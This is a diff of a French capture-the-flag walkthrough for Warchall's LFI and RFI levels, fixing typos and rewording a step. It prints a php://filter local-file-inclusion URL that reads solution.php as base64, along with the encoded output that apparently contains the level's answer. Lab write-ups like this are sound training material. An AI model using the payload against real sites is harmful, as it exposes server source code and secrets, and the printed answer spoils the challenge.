@@ -53,7 +53,7 @@
 
 ## [ level 14 ]
 - Cliquez sur le lien du challenge  **Live LFI** puis elle vous redirigera vers un site .
-- Cliquez sur l'un des drapeaux **anglais** ou le drapeau **allemand** et l' URL changera comme ceci :
+- Cliquez sur l'un des deux drapeaux : le drapeau **anglais** ou le drapeau **allemand** pour changer la langue et l' URL changera comme ceci :
   <pre>https://lfi.warchall.net/index.php?lang=en</pre>
 - Puis on change comme ci-dessous l'URL :
   <pre>https://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php</pre>
@@ -85,7 +85,7 @@
   https://rfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php
 
  - la page d'acceuil s'affichera mais il y a un long message et des messages de ***Warning*** qui sont ajoutées .
- - nous alllons ensuite copier le texte incomprehensible et le decoder avec les commandes suivantes :
+ - nous allons ensuite copier le texte incomprehensible et le decoder avec les commandes suivantes :
  - `echo " ` :
    ```
    PGh0bWw+Cjxib2R5Pgo8cHJlPk5PVEhJTkcgSEVSRT8/Pz88L3ByZT4KPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCByZXR1cm4gJ0xvd19INE5HSU5HX0ZydWl0JzsgPz4K
